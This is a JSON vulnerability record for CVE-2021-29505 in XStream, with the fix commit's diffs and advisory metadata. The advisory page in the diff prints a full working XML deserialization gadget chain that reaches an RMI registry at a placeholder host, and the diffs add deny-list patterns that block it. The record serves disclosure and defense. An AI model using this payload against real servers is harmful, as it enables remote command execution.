{
  "cve_id": "CVE-2021-29505",
  "github_data": {
    "repository": "x-stream/xstream",
    "fix_commit": "24fac82191292c6ae25f94508d28b9823f83624f",
    "related_commits": [
      "24fac82191292c6ae25f94508d28b9823f83624f",
      "24fac82191292c6ae25f94508d28b9823f83624f"
    ],
    "patch_url": null,
    "fix_commit_details": {
      "sha": "24fac82191292c6ae25f94508d28b9823f83624f",
      "commit_date": "2021-05-10T20:56:17Z",
      "author": {
        "login": "joehni",
        "type": "User",
        "stats": null
      },
      "commit_message": {
        "title": "Add description of CVE-2021-29505 and bug fix.",
        "length": 46,
        "has_description": false,
        "references_issue": true
      },
      "stats": {
        "total": 157,
        "additions": 152,
        "deletions": 5
      },
      "files": [
        {
          "filename": "xstream-distribution/src/content/CVE-2021-29505.html",
          "status": "added",
          "additions": 119,
          "deletions": 0,
          "patch": "@@ -0,0 +1,119 @@\n+<html>\n+<!--\n+ Copyright (C) 2021 XStream committers.\n+ All rights reserved.\n+ \n+ The software in this package is published under the terms of the BSD\n+ style license a copy of which has been included with this distribution in\n+ the LICENSE.txt file.\n+ \n+ Created on 8. May 2021 by Joerg Schaible\n+ -->\n+  <head>\n+    <title>CVE-2021-29505</title>\n+  </head>\n+  <body>\n+\n+    <h2 id=\"vulnerability\">Vulnerability</h2>\n+    \n+    <p>CVE-2021-29505: XStream is vulnerable to a Remote Command Execution attack.</p>\n+\t\n+    <h2 id=\"affected_versions\">Affected Versions</h2>\n+    \n+\t<p>All versions until and including version 1.4.16 are affected, if using the version out of the box. No user is\n+\taffected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security\n+\tframework</a> with a whitelist limited to the minimal required types.</p>\n+\n+    <h2 id=\"description\">Description</h2>\n+    \n+    <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.\n+    XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed\n+    input stream and replace or inject objects, that result in execution of a local command on the server.</p>\n+\n+    <h2 id=\"reproduction\">Steps to Reproduce</h2>\n+\n+\t<p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and\n+\tunmarshal it again with XStream:</p>\n+<div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;\n+  &lt;unserializable-parents/&gt;\n+  &lt;java.util.PriorityQueue&gt;\n+    &lt;default&gt;\n+      &lt;size&gt;2&lt;/size&gt;\n+    &lt;/default&gt;\n+    &lt;int&gt;3&lt;/int&gt;\n+    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n+      &lt;type&gt;12345&lt;/type&gt;\n+      &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;\n+        &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;&lt;/m__obj&gt;\n+      &lt;/value&gt;\n+    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n+    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n+      &lt;type&gt;12345&lt;/type&gt;\n+      &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;\n+        &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;\n+          &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;\n+          &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;\n+          &lt;bodyParts/&gt;\n+          &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;\n+            &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;\n+            &lt;multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;\n+              &lt;soapPart/&gt;\n+              &lt;mm&gt;\n+                &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;\n+                  &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;\n+                    &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;\n+                      &lt;names&gt;\n+                        &lt;string&gt;aa&lt;/string&gt;\n+                        &lt;string&gt;aa&lt;/string&gt;\n+                      &lt;/names&gt;\n+                      &lt;ctx&gt;\n+                        &lt;environment/&gt;\n+                        &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;\n+                          &lt;java.rmi.server.RemoteObject&gt;\n+                            &lt;string&gt;UnicastRef&lt;/string&gt;\n+                            &lt;string&gt;ip2&lt;/string&gt;\n+                            &lt;int&gt;1099&lt;/int&gt;\n+                            &lt;long&gt;0&lt;/long&gt;\n+                            &lt;int&gt;0&lt;/int&gt;\n+                            &lt;short&gt;0&lt;/short&gt;\n+                            &lt;boolean&gt;false&lt;/boolean&gt;\n+                          &lt;/java.rmi.server.RemoteObject&gt;\n+                        &lt;/registry&gt;\n+                        &lt;host&gt;ip2&lt;/host&gt;\n+                        &lt;port&gt;1099&lt;/port&gt;\n+                      &lt;/ctx&gt;\n+                    &lt;/candidates&gt;\n+                  &lt;/aliases&gt;\n+                &lt;/it&gt;\n+              &lt;/mm&gt;\n+            &lt;/multiPart&gt;\n+          &lt;/sm&gt;\n+        &lt;/message&gt;\n+      &lt;/value&gt;\n+    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;\n+  &lt;/java.util.PriorityQueue&gt;\n+&lt;/java.util.PriorityQueue&gt;\n+</pre></div>\n+<div class=\"Source Java\"><pre>XStream xstream = new XStream();\n+xstream.fromXML(xml);\n+</pre></div>\n+\n+    <p>As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.</p>\n+\n+    <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>\n+\n+    <h2 id=\"impact\">Impact</h2>\n+\n+\t<p>The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by\n+\tmanipulating the processed input stream.</p>\n+\n+    <h2 id=\"workarounds\">Workarounds</h2>\n+\n+    <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>\n+\n+    <h2 id=\"credits\">Credits</h2>\n+    \n+    <p>V3geB1rd, white hat hacker from Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>\n+    \n+  \t</body>\n+ </html>"
        },
        {
          "filename": "xstream-distribution/src/content/changes.html",
          "status": "modified",
          "additions": 17,
          "deletions": 2,
          "patch": "@@ -101,11 +101,26 @@ <h2>Stream compatibility</h2>\n \t\t<li>No support for Hibernate 3 collections.</li>\n \t</ul>\n \n-<!--\n \t<h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>\n \n \t<p>Not yet released.</p>\n--->\n+\n+\t<p class=\"highlight\">This maintenance release addresses the security vulnerability\n+\t<a href=\"CVE-2020-26258.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized\n+\tsecurity framework.</p>\n+\n+\t<h2>Stream compatibility</h2>\n+\n+\t<ul>\n+\t\t<li>The following types are now blacklisted by default and the deserialization\n+\t\tof XML containing one of the two types will fail.  You will have to enable these types by explicit\n+\t\tconfiguration, if you need them:<br>\n+\t\t\t<ul>\n+\t\t\t\t<li>any type in the java.rmi.* and sun.rmi.* package hierarchies</li>\n+\t\t\t\t<li>the individual type com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl</li>\n+\t\t\t</ul>\n+\t\t</li>\n+\t</ul>\n \n \t<h1 id=\"1.4.16\">1.4.16</h1>\n "
        },
        {
          "filename": "xstream-distribution/src/content/security.html",
          "status": "modified",
          "additions": 15,
          "deletions": 3,
          "patch": "@@ -44,11 +44,20 @@ <h2 id=\"CVEs\">Documented Vulnerabilities</h2>\n     Exposure (CVE) system managed by the <a href=\"http://www.mitre.org/\">Mitre Corporation</a>. Following a list of the\n     reported vulnerabilities for the different versions:</p>\n     \n-    <table summary=\"Table of reported vulnerabilities daocumented as CVE\">\n+    <table summary=\"Table of reported vulnerabilities documented as CVE\">\n       <tr>\n         <th>CVE</th>\n         <th>Description</th>\n       </tr>\n+      <tr>\n+        <th>Version 1.4.16</th>\n+        <td></td>\n+        <td></td>\n+      </tr>\n+      <tr>\n+        <th><a href=\"CVE-2021-29505.html\">CVE-2021-29505</a></th>\n+        <td>XStream is vulnerable to a Remote Command Execution attack.</td>\n+      </tr>\n       <tr>\n         <th>Version 1.4.15</th>\n         <td></td>\n@@ -393,16 +402,19 @@ <h2 id=\"workaround\">Workarounds for older XStream versions</h2>\n <div class=\"Source Java\"><pre>XStream xstream = new XStream();\n // add your allowed types, type hierarchies or packages here\n </pre></div>\n-    <p>Users of XStream 1.4.14 who insist to use XStream default blacklist - despite that clear recommendation - can\n+    <p>Users of XStream 1.4.16 who insist to use XStream default blacklist - despite that clear recommendation - can\n     add these lines to XStream's setup code:</p>\n+<div class=\"Source Java\"><pre>xstream.denyTypesByRegExp(new String[]{ \".*\\\\.Lazy(?:Search)?Enumeration.*\", \"(?:java|sun)\\\\.rmi\\\\..*\" });\n+</pre></div>\n+    <p>Users of XStream 1.4.15 should <strong>additionally</strong> add these lines to the lines from above:</p>\n <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"sun.swing.SwingLazyValue\", \"com.sun.corba.se.impl.activation.ServerTableEntry\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });\n xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\" });\n xstream.denyTypeHierarchy(java.io.InputStream.class );\n xstream.denyTypeHierarchy(java.nio.channels.Channel.class );\n xstream.denyTypeHierarchy(javax.activation.DataSource.class );\n xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class );\n </pre></div>\n-    <p>Users of XStream 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>\n+    <p>Users of XStream 1.4.14 and 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>\n <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\" });\n xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });\n </pre></div>"
        },
        {
          "filename": "xstream-distribution/src/content/website.xml",
          "status": "modified",
          "additions": 1,
          "deletions": 0,
          "patch": "@@ -74,6 +74,7 @@\n         <page>CVE-2021-21349.html</page>\n         <page>CVE-2021-21350.html</page>\n         <page>CVE-2021-21351.html</page>\n+        <page>CVE-2021-29505.html</page>\n         <page>CVE-2020-26217.html</page>\n         <page>CVE-2020-26258.html</page>\n         <page>CVE-2020-26259.html</page>"
        }
      ],
      "file_patterns": {
        "security_files": 1,
        "config_files": 0,
        "dependency_files": 0,
        "test_files": 0,
        "unique_directories": 1,
        "max_directory_depth": 3
      },
      "context": {
        "surrounding_commits": [
          {
            "sha": "9cbe8891fe698e4aeec1aca4b13d8ec868ccdf0a",
            "date": "2024-12-27T22:39:35Z",
            "author_login": "joehni"
          },
          {
            "sha": "d987316a7b4d7c48cbf0dd1396dde3853488b80b",
            "date": "2023-05-02T23:25:06Z",
            "author_login": "basil"
          },
          {
            "sha": "ab4a1729543e47f66889d2331ea65cca30dc7138",
            "date": "2024-11-06T20:15:41Z",
            "author_login": "joehni"
          },
          {
            "sha": "43e7156241a8cd176390ae853b472393724b55ed",
            "date": "2024-10-18T09:33:48Z",
            "author_login": "joehni"
          },
          {
            "sha": "9eef78cd85c51d3c77d6ee1061ee6df91f1dd36b",
            "date": "2024-11-06T18:11:09Z",
            "author_login": "joehni"
          }
        ]
      }
    }
  },
  "vulnerability_details": {
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cwe_id": "CWE-94",
    "description": "XStream is software for serializing Java objects to XML and back again. A vulnerability in XStream versions prior to 1.4.17 may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types is affected. The vulnerability is patched in version 1.4.17.",
    "attack_vector": "NETWORK",
    "attack_complexity": "HIGH"
  },
  "temporal_data": {
    "published_date": "2021-05-28T21:15:08.713",
    "last_modified": "2024-11-21T06:01:15.997",
    "fix_date": "2021-05-10T20:56:17Z"
  },
  "references": [
    {
      "url": "https://github.com/x-stream/xstream/commit/24fac82191292c6ae25f94508d28b9823f83624f",
      "source": "security-advisories@github.com",
      "tags": [
        "Patch",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://github.com/x-stream/xstream/security/advisories/GHSA-7chv-rrw6-w6fc",
      "source": "security-advisories@github.com",
      "tags": [
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://lists.apache.org/thread.html/r8ee51debf7fd184b6a6b020dc31df25118b0aa612885f12fbe77f04f%40%3Cdev.jmeter.apache.org%3E",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://lists.debian.org/debian-lts-announce/2021/07/msg00004.html",
      "source": "security-advisories@github.com",
      "tags": [
        "Mailing List",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/22KVR6B5IZP3BGQ3HPWIO2FWWCKT3DHP/",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PVPHZA7VW2RRSDCOIPP2W6O5ND254TU7/",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QGXIU3YDPG6OGTDHMBLAFN7BPBERXREB/",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://security.netapp.com/advisory/ntap-20210708-0007/",
      "source": "security-advisories@github.com",
      "tags": [
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://www.debian.org/security/2021/dsa-5004",
      "source": "security-advisories@github.com",
      "tags": [
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://www.oracle.com/security-alerts/cpuapr2022.html",
      "source": "security-advisories@github.com",
      "tags": [
        "Patch",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://www.oracle.com/security-alerts/cpujan2022.html",
      "source": "security-advisories@github.com",
      "tags": [
        "Patch",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://www.oracle.com/security-alerts/cpujul2022.html",
      "source": "security-advisories@github.com",
      "tags": []
    },
    {
      "url": "https://www.oracle.com/security-alerts/cpuoct2021.html",
      "source": "security-advisories@github.com",
      "tags": [
        "Mailing List",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://github.com/x-stream/xstream/commit/24fac82191292c6ae25f94508d28b9823f83624f",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Patch",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://github.com/x-stream/xstream/security/advisories/GHSA-7chv-rrw6-w6fc",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://lists.apache.org/thread.html/r8ee51debf7fd184b6a6b020dc31df25118b0aa612885f12fbe77f04f%40%3Cdev.jmeter.apache.org%3E",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://lists.debian.org/debian-lts-announce/2021/07/msg00004.html",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Mailing List",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/22KVR6B5IZP3BGQ3HPWIO2FWWCKT3DHP/",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PVPHZA7VW2RRSDCOIPP2W6O5ND254TU7/",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QGXIU3YDPG6OGTDHMBLAFN7BPBERXREB/",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://security.netapp.com/advisory/ntap-20210708-0007/",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://www.debian.org/security/2021/dsa-5004",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://www.oracle.com/security-alerts/cpuapr2022.html",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Patch",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://www.oracle.com/security-alerts/cpujan2022.html",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Patch",
        "Third Party Advisory"
      ]
    },
    {
      "url": "https://www.oracle.com/security-alerts/cpujul2022.html",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": []
    },
    {
      "url": "https://www.oracle.com/security-alerts/cpuoct2021.html",
      "source": "af854a3a-2127-422b-91ae-364da2661108",
      "tags": [
        "Mailing List",
        "Third Party Advisory"
      ]
    }
  ],
  "collection_metadata": {
    "collected_at": "2025-01-11T23:01:57.130650",
    "processing_status": "enhanced"
  },
  "repository_context": {
    "name": "xstream",
    "owner": "x-stream",
    "created_at": "2015-03-14T15:57:12Z",
    "updated_at": "2025-01-21T05:31:25Z",
    "pushed_at": "2024-12-27T22:39:39Z",
    "size": 21741,
    "stars": 752,
    "forks": 228,
    "open_issues": 37,
    "watchers": 752,
    "has_security_policy": false,
    "default_branch": "master",
    "protected_branches": [],
    "languages": {
      "Java": 2852082,
      "HTML": 711607,
      "CSS": 7028,
      "Batchfile": 2073,
      "Shell": 1714,
      "XSLT": 1128
    },
    "commit_activity": {
      "total_commits_last_year": 0,
      "avg_commits_per_week": 0,
      "days_active_last_year": 0
    },
    "security_features": {
      "has_security_policy": false,
      "has_protected_branches": false,
      "has_wiki": false,
      "has_issues": true,
      "allow_forking": true,
      "is_template": false,
      "license": "other"
    },
    "collected_at": "2025-01-26T07:46:56.159043"
  }
}